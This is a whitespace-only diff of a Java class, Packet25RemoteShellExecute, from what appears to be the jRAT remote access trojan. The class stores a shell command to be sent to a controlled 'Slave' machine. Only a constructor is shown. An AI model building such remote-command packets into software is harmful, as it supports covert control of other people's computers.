@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet25RemoteShellExecute extends AbstractOutgoingPacket {
-	
+
 	private String command;
-	
+
 	public Packet25RemoteShellExecute(String command) {
 		this.command = command;
 	}
